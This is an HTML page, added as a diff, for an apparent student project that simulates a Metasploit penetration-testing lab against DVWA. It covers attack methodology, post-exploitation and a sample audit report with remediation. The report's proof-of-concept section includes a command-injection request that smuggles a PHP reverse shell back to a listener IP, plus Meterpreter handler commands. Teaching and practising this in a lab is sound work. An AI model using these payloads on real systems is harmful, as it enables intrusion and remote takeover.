@@ -1,0 +1,695 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Metasploit Lab on DVWA | Ethical Hacking & Penetration Testing</title>
+  <meta name="description" content="Interactive Metasploit Framework & DVWA Penetration Testing Lab simulator, demonstrating exploit execution, post-exploitation, attacker methodology, and legal compliance reporting.">
+  
+  <!-- Google Fonts -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@400;500;600;700&family=Inter:wght@300;400;500;600;700;800&family=Orbitron:wght@600;800&display=swap" rel="stylesheet">
+  
+  <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+  <!-- Top Navigation & Header -->
+  <header class="app-header">
+    <div class="header-brand">
+      <div class="cyber-badge-pulse"></div>
+      <div class="brand-text">
+        <span class="brand-category">ETHICAL HACKING & PENETRATION TESTING</span>
+        <h1 class="brand-title">
+          <span class="icon-rocket">🚀</span> Why Industry Likes This Project: 
+          <span class="highlight-text">Metasploit Lab on DVWA</span>
+        </h1>
+      </div>
+    </div>
+    
+    <div class="header-actions">
+      <div class="lab-status-badge">
+        <span class="status-indicator"></span>
+        <span id="targetStatusText">Target: DVWA (192.168.1.105) Low-Security</span>
+      </div>
+      <button class="btn btn-outline" id="quickGuideBtn">📘 Lab Manual</button>
+      <button class="btn btn-cyber" id="generateReportNavBtn">📑 Generate Audit Report</button>
+    </div>
+  </header>
+
+  <!-- Navigation Tabs -->
+  <nav class="main-tabs" id="tabBar">
+    <button class="tab-btn active" data-tab="lab">
+      <span class="tab-icon">⚡</span> Exploit Simulation Lab
+    </button>
+    <button class="tab-btn" data-tab="lifecycle">
+      <span class="tab-icon">🔄</span> Attack Lifecycle & Methodology
+    </button>
+    <button class="tab-btn" data-tab="postexploit">
+      <span class="tab-icon">💻</span> Post-Exploitation & Persistence
+    </button>
+    <button class="tab-btn" data-tab="reporting">
+      <span class="tab-icon">📋</span> Legal Reporting (PTES Standard)
+    </button>
+    <button class="tab-btn" data-tab="industry">
+      <span class="tab-icon">💼</span> Industry Value & Team
+    </button>
+  </nav>
+
+  <!-- Main Container -->
+  <main class="app-container">
+
+    <!-- TAB 1: EXPLOIT SIMULATION LAB -->
+    <section class="tab-pane active" id="labPane">
+      <div class="split-workspace">
+        
+        <!-- Left Column: Scenario & Target Control Panel -->
+        <div class="panel target-control-panel">
+          <div class="panel-header">
+            <h2>🎯 Target & Scenario Controller</h2>
+            <span class="badge badge-accent">DVWA v1.10</span>
+          </div>
+          
+          <div class="control-group">
+            <label class="control-label" for="attackVectorSelect">Attack Vector Scenario:</label>
+            <select id="attackVectorSelect" class="form-select">
+              <option value="command_injection" selected>Command Injection (OS Shell via DVWA Exec)</option>
+              <option value="file_upload">Malicious File Upload (PHP Meterpreter Reverse TCP)</option>
+              <option value="sql_injection">SQL Injection & Automated Database Dump</option>
+              <option value="auxiliary_scanner">Recon: Port Scanning & Service Fingerprinting</option>
+            </select>
+          </div>
+
+          <div class="control-group">
+            <label class="control-label">Target DVWA Security Level:</label>
+            <div class="security-level-selector" id="secLevelSelector">
+              <button class="btn-sec active" data-level="low">Low (Vulnerable)</button>
+              <button class="btn-sec" data-level="medium">Medium (Filtered)</button>
+              <button class="btn-sec" data-level="high">High (Strict)</button>
+              <button class="btn-sec" data-level="impossible">Impossible (Patched)</button>
+            </div>
+            <p class="sec-help-text" id="secHelpText">
+              Direct concatenation of user input without sanitization. Shell execution will succeed directly.
+            </p>
+          </div>
+
+          <!-- Target Preview Card -->
+          <div class="dvwa-preview-card">
+            <div class="dvwa-browser-bar">
+              <span class="circle red"></span>
+              <span class="circle yellow"></span>
+              <span class="circle green"></span>
+              <span class="dvwa-url" id="dvwaUrl">http://192.168.1.105/dvwa/vulnerabilities/exec/</span>
+            </div>
+            <div class="dvwa-inner-content" id="dvwaInnerContent">
+              <div class="dvwa-logo">Damn Vulnerable Web App</div>
+              <h3 id="dvwaPageTitle">Vulnerability: Command Execution</h3>
+              <div class="dvwa-form">
+                <label>Enter an IP address:</label>
+                <div class="input-group">
+                  <input type="text" id="dvwaInput" value="127.0.0.1; whoami" readonly>
+                  <button class="btn-dvwa" id="dvwaSubmitBtn">Submit</button>
+                </div>
+              </div>
+              <pre class="dvwa-output" id="dvwaOutput">Target ready. Awaiting payload execution from Metasploit...</pre>
+            </div>
+          </div>
+
+          <!-- Quick Action Buttons -->
+          <div class="quick-actions">
+            <h4>Quick Workflow Execution:</h4>
+            <div class="action-grid">
+              <button class="btn btn-action" id="btnAutoScan">1. Nmap Scan</button>
+              <button class="btn btn-action" id="btnAutoSetup">2. Set Exploit & Payload</button>
+              <button class="btn btn-action btn-danger-glow" id="btnAutoExploit">3. Fire Exploit 🚀</button>
+              <button class="btn btn-action" id="btnAutoPost">4. Run Meterpreter Shell</button>
+            </div>
+          </div>
+
+          <!-- Vulnerable Code vs Remediation Preview -->
+          <div class="code-compare-card">
+            <div class="code-compare-header">
+              <span>Code Defense Inspector</span>
+              <button class="btn-xs" id="toggleCodeViewBtn">Toggle Secure Patch</button>
+            </div>
+            <pre class="code-snippet" id="sourceCodeSnippet"><code>// Vulnerable PHP (Low Security)
+$target = $_REQUEST[ 'ip' ];
+// Direct execution without sanitization
+$cmd = shell_exec( 'ping -c 4 ' . $target );
+echo "&lt;pre&gt;{$cmd}&lt;/pre&gt;";</code></pre>
+          </div>
+        </div>
+
+        <!-- Right Column: Interactive msfconsole Terminal -->
+        <div class="panel terminal-panel">
+          <div class="terminal-header">
+            <div class="terminal-title">
+              <span class="term-dot"></span>
+              <span>msfconsole — Metasploit Framework v6.4.12-dev</span>
+            </div>
+            <div class="terminal-toolbar">
+              <span class="session-badge" id="activeSessionBadge">Active Sessions: 0</span>
+              <button class="term-btn" id="clearTermBtn" title="Clear Screen">Clear</button>
+              <button class="term-btn" id="helpTermBtn" title="Show Commands">Help</button>
+            </div>
+          </div>
+          
+          <div class="terminal-body" id="terminalOutput">
+            <!-- Output injected by JS -->
+          </div>
+
+          <div class="terminal-input-row">
+            <span class="prompt" id="promptText">msf6 &gt; </span>
+            <input type="text" id="terminalInput" class="term-input" autocomplete="off" spellcheck="false" placeholder="Type a command (e.g., 'help', 'search dvwa', 'exploit', 'sessions -i 1')...">
+            <button class="term-send-btn" id="termSendBtn">Send</button>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- TAB 2: ATTACK LIFECYCLE & METHODOLOGY -->
+    <section class="tab-pane" id="lifecyclePane">
+      <div class="panel">
+        <div class="panel-header">
+          <div>
+            <h2>🔄 Understanding the Full Attack Lifecycle & Attacker Mindset</h2>
+            <p class="subtitle">How professional penetration testers align exploitation methodology with MITRE ATT&CK and NIST SP 800-115 standards.</p>
+          </div>
+          <button class="btn btn-cyber" id="simulateLifecycleBtn">▶ Run Animated Walkthrough</button>
+        </div>
+
+        <div class="lifecycle-stepper">
+          <!-- Step 1 -->
+          <div class="lifecycle-step active" data-step="1">
+            <div class="step-icon">🔍</div>
+            <div class="step-info">
+              <h3>1. Reconnaissance & Discovery</h3>
+              <p>Recon scanning of target network, detecting open ports (80/443 HTTP, 22 SSH, 3306 MySQL), web server version (Apache/2.4.41, PHP 7.4.3).</p>
+              <div class="step-tags">
+                <span class="tag">Nmap</span>
+                <span class="tag">auxiliary/scanner/portscan/tcp</span>
+                <span class="tag">Nikto</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Step 2 -->
+          <div class="lifecycle-step" data-step="2">
+            <div class="step-icon">🎯</div>
+            <div class="step-info">
+              <h3>2. Vulnerability Identification</h3>
+              <p>Auditing DVWA endpoints for injection flaws, unauthenticated file upload endpoints, and missing sanitation boundaries.</p>
+              <div class="step-tags">
+                <span class="tag">OWASP Top 10 A03: Injection</span>
+                <span class="tag">CWE-78: OS Command Injection</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Step 3 -->
+          <div class="lifecycle-step" data-step="3">
+            <div class="step-icon">⚙️</div>
+            <div class="step-info">
+              <h3>3. Weaponization & Payload Generation</h3>
+              <p>Generating custom stage/staged payloads with <code>msfvenom</code> or selecting Metasploit modules matching target architecture.</p>
+              <div class="step-tags">
+                <span class="tag">msfvenom</span>
+                <span class="tag">php/meterpreter/reverse_tcp</span>
+                <span class="tag">LHOST / LPORT</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Step 4 -->
+          <div class="lifecycle-step" data-step="4">
+            <div class="step-icon">💥</div>
+            <div class="step-info">
+              <h3>4. Exploitation & Callback</h3>
+              <p>Firing the exploit against DVWA input vectors, receiving reverse TCP socket connection on Metasploit multi/handler listener.</p>
+              <div class="step-tags">
+                <span class="tag">exploit/multi/handler</span>
+                <span class="tag">Reverse TCP Handshake</span>
+                <span class="tag">Stage Delivery</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Step 5 -->
+          <div class="lifecycle-step" data-step="5">
+            <div class="step-icon">👑</div>
+            <div class="step-info">
+              <h3>5. Post-Exploitation & Persistence</h3>
+              <p>Operating inside Meterpreter: system enumeration, process migration, hash extraction, credential theft, and stealth persistence.</p>
+              <div class="step-tags">
+                <span class="tag">meterpreter</span>
+                <span class="tag">sysinfo</span>
+                <span class="tag">getuid</span>
+                <span class="tag">hashdump</span>
+              </div>
+            </div>
+          </div>
+
+          <!-- Step 6 -->
+          <div class="lifecycle-step" data-step="6">
+            <div class="step-icon">🛡️</div>
+            <div class="step-info">
+              <h3>6. Remediation & Legal Reporting</h3>
+              <p>Translating attacker steps into defensible engineering fixes: input validation, least privilege user isolation, and enterprise compliance reporting.</p>
+              <div class="step-tags">
+                <span class="tag">OWASP ASVS</span>
+                <span class="tag">CVSS 3.1 Scoring</span>
+                <span class="tag">Patch Deployment</span>
+              </div>
+            </div>
+          </div>
+        </div>
+
+        <!-- Comparative Attacker vs Defender Table -->
+        <div class="lifecycle-comparison">
+          <h3>Attacker Mindset vs. Ethical Hacker Mindset</h3>
+          <div class="table-responsive">
+            <table class="cyber-table">
+              <thead>
+                <tr>
+                  <th>Phase</th>
+                  <th>Black-Hat Attacker Action</th>
+                  <th>Ethical Hacker / Penetration Tester Action</th>
+                  <th>Business Value Delivered</th>
+                </tr>
+              </thead>
+              <tbody>
+                <tr>
+                  <td><strong>Exploitation</strong></td>
+                  <td>Exfiltrates proprietary records or deploys ransomware payload.</td>
+                  <td>Executes controlled proof-of-concept (PoC) exploit within agreed legal scope.</td>
+                  <td>Demonstrates actual exploitability beyond hypothetical static alerts.</td>
+                </tr>
+                <tr>
+                  <td><strong>Post-Exploit</strong></td>
+                  <td>Destroys system logs, installs rootkits, pivots to internal active directory.</td>
+                  <td>Gathers non-destructive evidence (uid, host info, config access levels) and cleans artifacts.</td>
+                  <td>Identifies blast radius and secondary lateral movement risk.</td>
+                </tr>
+                <tr>
+                  <td><strong>Reporting</strong></td>
+                  <td>Extortion or dark web sale.</td>
+                  <td>Formal documentation with CVSS rating, timeline, and actionable code-level fixes.</td>
+                  <td>Provides audit-grade artifacts for executive leadership and engineering teams.</td>
+                </tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- TAB 3: POST-EXPLOITATION & PERSISTENCE -->
+    <section class="tab-pane" id="postexploitPane">
+      <div class="panel">
+        <div class="panel-header">
+          <div>
+            <h2>💻 Post-Exploitation Techniques & Persistence Suite</h2>
+            <p class="subtitle">Explore active commands executed within an established Meterpreter session on the compromised DVWA host.</p>
+          </div>
+          <span class="badge badge-warning" id="meterpreterStatusBadge">Meterpreter Session: Idle</span>
+        </div>
+
+        <div class="post-exploit-grid">
+          <!-- Quick Command Cards -->
+          <div class="post-card" data-cmd="sysinfo">
+            <div class="post-card-icon">🖥️</div>
+            <h4>System Enumeration (<code>sysinfo</code>)</h4>
+            <p>Discovers OS kernel, architecture, computer hostname, and domain membership.</p>
+            <button class="btn btn-xs btn-cyber execute-post-btn" data-cmd="sysinfo">Execute in Console</button>
+          </div>
+
+          <div class="post-card" data-cmd="getuid">
+            <div class="post-card-icon">👤</div>
+            <h4>User Identity (<code>getuid</code>)</h4>
+            <p>Determines effective user identity (e.g., <code>www-data</code> vs <code>root</code> / <code>SYSTEM</code>).</p>
+            <button class="btn btn-xs btn-cyber execute-post-btn" data-cmd="getuid">Execute in Console</button>
+          </div>
+
+          <div class="post-card" data-cmd="hashdump">
+            <div class="post-card-icon">🔑</div>
+            <h4>Credential Harvesting (<code>hashdump</code>)</h4>
+            <p>Attempts dump of password database/shadow file for offline cracking validation.</p>
+            <button class="btn btn-xs btn-cyber execute-post-btn" data-cmd="hashdump">Execute in Console</button>
+          </div>
+
+          <div class="post-card" data-cmd="shell">
+            <div class="post-card-icon">🐚</div>
+            <h4>Interactive OS Shell (<code>shell</code>)</h4>
+            <p>Drops from Meterpreter binary into standard native Linux bash terminal.</p>
+            <button class="btn btn-xs btn-cyber execute-post-btn" data-cmd="shell">Execute in Console</button>
+          </div>
+
+          <div class="post-card" data-cmd="persistence">
+            <div class="post-card-icon">⏳</div>
+            <h4>Persistence Mechanism (Cron / Backdoor)</h4>
+            <p>Analyzes how adversaries plant persistent cron jobs and reverse callbacks.</p>
+            <button class="btn btn-xs btn-cyber execute-post-btn" data-cmd="persistence">Inspect Vector</button>
+          </div>
+
+          <div class="post-card" data-cmd="privesc">
+            <div class="post-card-icon">🛡️</div>
+            <h4>Privilege Escalation Check</h4>
+            <p>Checks SUID binaries, misconfigured sudoers, and kernel vulnerabilities.</p>
+            <button class="btn btn-xs btn-cyber execute-post-btn" data-cmd="privesc">Run Check</button>
+          </div>
+        </div>
+
+        <!-- Post-Exploit Terminal Output Inspector -->
+        <div class="post-output-container">
+          <div class="output-header">
+            <span>Meterpreter Session Inspector Output:</span>
+            <button class="btn-xs" id="clearPostLogBtn">Clear Output</button>
+          </div>
+          <pre class="post-output-pre" id="postExploitOutput">[*] Select a post-exploitation module above or execute commands directly inside the interactive msfconsole to see live payloads.</pre>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- TAB 4: LEGAL REPORTING (PTES STANDARD) -->
+    <section class="tab-pane" id="reportingPane">
+      <div class="panel">
+        <div class="panel-header">
+          <div>
+            <h2>📋 Penetration Testing Legal & Compliance Report Generator</h2>
+            <p class="subtitle">Produce industry-standard documentation aligned with PTES (Penetration Testing Execution Standard).</p>
+          </div>
+          <div class="report-actions">
+            <button class="btn btn-outline" id="printReportBtn">🖨️ Print / Save PDF</button>
+            <button class="btn btn-cyber" id="copyMarkdownReportBtn">📋 Copy Markdown</button>
+          </div>
+        </div>
+
+        <!-- Report Customizer Controls -->
+        <div class="report-settings-bar">
+          <div class="setting-item">
+            <label>Target Scope:</label>
+            <input type="text" id="reportScopeInput" value="DVWA v1.10 (192.168.1.105)">
+          </div>
+          <div class="setting-item">
+            <label>Lead Auditor / Team:</label>
+            <input type="text" id="reportAuditorInput" value="Umma Jubaiya, Kowshik, Sahjada Abdullah, Satyam Paliya">
+          </div>
+          <div class="setting-item">
+            <label>Assessment Type:</label>
+            <select id="reportTypeSelect">
+              <option value="whitebox">White-Box Web Application Penetration Test</option>
+              <option value="blackbox">Black-Box Network & Web App Exploit Assessment</option>
+            </select>
+          </div>
+          <div class="setting-item">
+            <label>Refresh Findings:</label>
+            <button class="btn btn-action" id="compileReportBtn">Generate Live Report</button>
+          </div>
+        </div>
+
+        <!-- Document Preview Canvas (Formal Report) -->
+        <div class="report-paper-container" id="reportPrintArea">
+          <article class="report-document">
+            <div class="report-header-section">
+              <div class="report-badge">CONFIDENTIAL AUDIT REPORT</div>
+              <h1 class="report-main-title">Penetration Testing Assessment & Vulnerability Audit Report</h1>
+              <div class="report-meta-grid">
+                <div><strong>Target Environment:</strong> <span id="repTarget">DVWA v1.10 (192.168.1.105)</span></div>
+                <div><strong>Date of Assessment:</strong> <span id="repDate"></span></div>
+                <div><strong>Assessment Framework:</strong> PTES & OWASP Testing Guide v4</div>
+                <div><strong>Assessment Lead:</strong> <span id="repAuditor">Umma Jubaiya, Kowshik, Sahjada Abdullah, Satyam Paliya</span></div>
+              </div>
+            </div>
+
+            <hr class="report-divider">
+
+            <section class="report-section">
+              <h2>1. Executive Summary</h2>
+              <p>
+                During the authorized penetration testing assessment, the security team conducted simulated cyber attacks against the <strong>Damn Vulnerable Web Application (DVWA)</strong> target using the <strong>Metasploit Framework</strong>. The objective was to evaluate the resilience of the web application against exploitation, assess lateral movement opportunities via post-exploitation, and formulate actionable code-level remediation.
+              </p>
+              <div class="risk-highlight-box">
+                <div class="risk-score-badge">CRITICAL RISK</div>
+                <div>
+                  <strong>Primary Finding:</strong> Unrestricted OS Command Injection vulnerability in the web tier allows arbitrary code execution with <code>www-data</code> privileges, enabling full interactive Meterpreter reverse shell deployment and potential host takeover.
+                </div>
+              </div>
+            </section>
+
+            <section class="report-section">
+              <h2>2. Vulnerability Findings & CVSS Matrix</h2>
+              <table class="report-vuln-table">
+                <thead>
+                  <tr>
+                    <th>Vulnerability</th>
+                    <th>CVE / CWE</th>
+                    <th>CVSS v3.1</th>
+                    <th>Severity</th>
+                    <th>Status</th>
+                  </tr>
+                </thead>
+                <tbody id="reportVulnTableBody">
+                  <tr>
+                    <td><strong>Remote OS Command Injection</strong></td>
+                    <td>CWE-78 / CVE-2014-XXXX</td>
+                    <td>9.8 (Critical)</td>
+                    <td><span class="badge-crit">CRITICAL</span></td>
+                    <td>Confirmed Exploited</td>
+                  </tr>
+                  <tr>
+                    <td><strong>Arbitrary File Upload (Web Shell)</strong></td>
+                    <td>CWE-434</td>
+                    <td>8.8 (High)</td>
+                    <td><span class="badge-high">HIGH</span></td>
+                    <td>Confirmed Exploited</td>
+                  </tr>
+                  <tr>
+                    <td><strong>SQL Injection (Data Exfiltration)</strong></td>
+                    <td>CWE-89</td>
+                    <td>8.5 (High)</td>
+                    <td><span class="badge-high">HIGH</span></td>
+                    <td>Demonstrated</td>
+                  </tr>
+                </tbody>
+              </table>
+            </section>
+
+            <section class="report-section">
+              <h2>3. Technical Proof of Concept (PoC) & Exploitation Steps</h2>
+              <p>The following steps document the exact execution path utilized during the test to validate exploitability:</p>
+              <div class="poc-step-box">
+                <h4>Step 3.1: Metasploit Framework Configuration</h4>
+                <pre class="poc-pre">msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set PAYLOAD php/meterpreter/reverse_tcp
+msf6 exploit(multi/handler) &gt; set LHOST 192.168.1.50
+msf6 exploit(multi/handler) &gt; set LPORT 4444
+msf6 exploit(multi/handler) &gt; exploit -j</pre>
+              </div>
+              <div class="poc-step-box">
+                <h4>Step 3.2: Injection Vector Trigger</h4>
+                <p>Target input payload dispatched via HTTP POST:</p>
+                <pre class="poc-pre">POST /dvwa/vulnerabilities/exec/ HTTP/1.1
+Host: 192.168.1.105
+Cookie: PHPSESSID=s3cur1ty123; security=low
+Content-Type: application/x-www-form-urlencoded
+
+ip=127.0.0.1+%26%26+php+-r+'$sock=fsockopen("192.168.1.50",4444);exec("/bin/sh+-i+&lt;%263+&gt;%263+2&gt;%263");'&amp;Submit=Submit</pre>
+              </div>
+              <div class="poc-step-box">
+                <h4>Step 3.3: Post-Exploitation Proof of Compromise</h4>
+                <pre class="poc-pre">[*] Meterpreter session 1 opened (192.168.1.50:4444 -&gt; 192.168.1.105:49210)
+meterpreter &gt; sysinfo
+OS: Linux dvwa-target 5.4.0-42-generic #46-Ubuntu SMP
+meterpreter &gt; getuid
+Server username: www-data (uid: 33, gid: 33)</pre>
+              </div>
+            </section>
+
+            <section class="report-section">
+              <h2>4. Actionable Remediation & Hardening Roadmap</h2>
+              <div class="remediation-grid">
+                <div class="remediation-item">
+                  <h4>1. Implement Input Sanitization & Whitelisting</h4>
+                  <p>Never pass unsanitized user variables directly to shell execution functions. In PHP, strictly filter inputs with <code>filter_var($ip, FILTER_VALIDATE_IP)</code> or avoid <code>shell_exec()</code> completely.</p>
+                </div>
+                <div class="remediation-item">
+                  <h4>2. Enforce Least Privilege Principle</h4>
+                  <p>Run web server processes under unprivileged service accounts with restricted file system write permissions and disabled interactive shell binaries (<code>/bin/false</code>).</p>
+                </div>
+                <div class="remediation-item">
+                  <h4>3. Web Application Firewall (WAF) Integration</h4>
+                  <p>Deploy ModSecurity or cloud-native WAF rules to inspect and terminate malicious command chaining characters (<code>;</code>, <code>&amp;&amp;</code>, <code>|</code>, backticks).</p>
+                </div>
+              </div>
+            </section>
+
+            <div class="report-signoff-section">
+              <div class="signoff-box">
+                <div class="signoff-line"></div>
+                <strong>Umma Jubaiya &amp; Kowshik</strong>
+                <p>Security Research &amp; Penetration Testing Leads</p>
+              </div>
+              <div class="signoff-box">
+                <div class="signoff-line"></div>
+                <strong>Sahjada Abdullah &amp; Satyam Paliya</strong>
+                <p>Exploit Engineering &amp; Compliance Verification</p>
+              </div>
+            </div>
+          </article>
+        </div>
+
+      </div>
+    </section>
+
+    <!-- TAB 5: INDUSTRY VALUE & TEAM -->
+    <section class="tab-pane" id="industryPane">
+      <div class="panel">
+        <div class="panel-header">
+          <div>
+            <h2>💼 Why Industry Likes This Project: Technical Credibility Breakdown</h2>
+            <p class="subtitle">An in-depth analysis of why cybersecurity hiring managers and security teams value hands-on Metasploit on DVWA experience.</p>
+          </div>
+        </div>
+
+        <!-- The 4 Core Pillars from the User's Image -->
+        <div class="pillar-grid">
+          
+          <div class="pillar-card">
+            <div class="pillar-icon">💥</div>
+            <h3>1. Real Exploit Execution in a Lab Setup</h3>
+            <p class="pillar-desc">
+              Theory is insufficient in defensive and offensive operations. Setting up DVWA and targeting it with Metasploit proves candidate understands socket connectivity, listener configuration, firewall traversal, and live payload execution.
+            </p>
+            <div class="pillar-skills">
+              <span>TCP Handshakes</span>
+              <span>Payload Encoders</span>
+              <span>msfconsole Architecture</span>
+            </div>
+          </div>
+
+          <div class="pillar-card">
+            <div class="pillar-icon">🗝️</div>
+            <h3>2. Post-Exploitation & Persistence</h3>
+            <p class="pillar-desc">
+              Initial access is only step one. Industry penetration testers must demonstrate business impact by inspecting local configurations, evaluating privilege escalation vectors, and proving whether an adversary could maintain stealthy persistence.
+            </p>
+            <div class="pillar-skills">
+              <span>Meterpreter Scripting</span>
+              <span>Credential Extraction</span>
+              <span>Privilege Auditing</span>
+            </div>
+          </div>
+
+          <div class="pillar-card">
+            <div class="pillar-icon">🧠</div>
+            <h3>3. Understanding Attacker Mindset & Methodology</h3>
+            <p class="pillar-desc">
+              To defend a system, you must know how adversaries think. Emulating real attacks teaches the end-to-end cyber kill chain, separating script kiddies from skilled analysts who can design robust defense-in-depth architecture.
+            </p>
+            <div class="pillar-skills">
+              <span>Cyber Kill Chain</span>
+              <span>MITRE ATT&CK Mapping</span>
+              <span>Defense in Depth</span>
+            </div>
+          </div>
+
+          <div class="pillar-card">
+            <div class="pillar-icon">📑</div>
+            <h3>4. Documenting Steps for Legal Reporting</h3>
+            <p class="pillar-desc">
+              Hacking without permission is illegal; penetration testing without thorough documentation is useless. Candidates who can write clear executive summaries, CVSS severity ratings, and reproducible PoCs deliver immediate ROI.
+            </p>
+            <div class="pillar-skills">
+              <span>PTES Standards</span>
+              <span>CVSS v3.1 Scoring</span>
+              <span>Executive Communications</span>
+            </div>
+          </div>
+
+        </div>
+
+        <!-- Quote Callout Card (From the image) -->
+        <div class="quote-card">
+          <div class="quote-symbol">❝</div>
+          <div class="quote-body">
+            <h3>Ethical hackers who have used Metasploit hands-on are far more credible to hiring teams.</h3>
+            <p>Metasploit is the industry standard exploitation framework. Running controlled exploits on a legal target teaches the full attack lifecycle in a safe environment.</p>
+          </div>
+        </div>
+
+        <!-- Project Contributors & Team Credits -->
+        <div class="team-section">
+          <h3>Project Contributors & Research Team</h3>
+          <div class="team-grid">
+            
+            <div class="team-card">
+              <div class="avatar-circle">UJ</div>
+              <h4>Umma Jubaiya</h4>
+              <span class="role-badge">Lead Researcher</span>
+              <p>Ethical Hacking & Exploit Architecture</p>
+            </div>
+
+            <div class="team-card">
+              <div class="avatar-circle">K</div>
+              <h4>Kowshik</h4>
+              <span class="role-badge">Exploit Engineer</span>
+              <p>Metasploit Module Configuration & Payloads</p>
+            </div>
+
+            <div class="team-card">
+              <div class="avatar-circle">SA</div>
+              <h4>Sahjada Abdullah</h4>
+              <span class="role-badge">Security Analyst (2nd)</span>
+              <p>Vulnerability Assessment & Target Hardening</p>
+            </div>
+
+            <div class="team-card">
+              <div class="avatar-circle">SP</div>
+              <h4>Satyam Paliya</h4>
+              <span class="role-badge">Documentation Lead</span>
+              <p>Legal Reporting & Compliance Mapping</p>
+            </div>
+
+          </div>
+        </div>
+
+      </div>
+    </section>
+
+  </main>
+
+  <!-- Modal: Lab Manual / Cheat Sheet -->
+  <div class="modal-backdrop" id="manualModal">
+    <div class="modal-card">
+      <div class="modal-header">
+        <h3>📖 Metasploit Lab on DVWA — Command Cheat Sheet</h3>
+        <button class="modal-close-btn" id="closeModalBtn">&times;</button>
+      </div>
+      <div class="modal-body">
+        <h4>Essential MSFConsole Commands:</h4>
+        <ul class="cmd-list">
+          <li><code>search dvwa</code> — Search for Metasploit modules matching DVWA vulnerabilities</li>
+          <li><code>use exploit/multi/handler</code> — Open a generic payload listener</li>
+          <li><code>set PAYLOAD php/meterpreter/reverse_tcp</code> — Select the PHP reverse Meterpreter</li>
+          <li><code>set LHOST 192.168.1.50</code> — Set listener IP (Attacker machine)</li>
+          <li><code>set LPORT 4444</code> — Set listener port</li>
+          <li><code>exploit</code> or <code>run</code> — Launch the exploit module or listener</li>
+          <li><code>sessions -l</code> — List all active sessions</li>
+          <li><code>sessions -i 1</code> — Interact with active Meterpreter session #1</li>
+          <li><code>sysinfo</code> — Display target system hardware and operating system info</li>
+          <li><code>getuid</code> — Display target user identity</li>
+          <li><code>shell</code> — Spawn native OS command prompt</li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notification Toast -->
+  <div class="toast" id="toastMessage">Action completed</div>
+
+  <script src="app.js"></script>
+</body>
+</html>
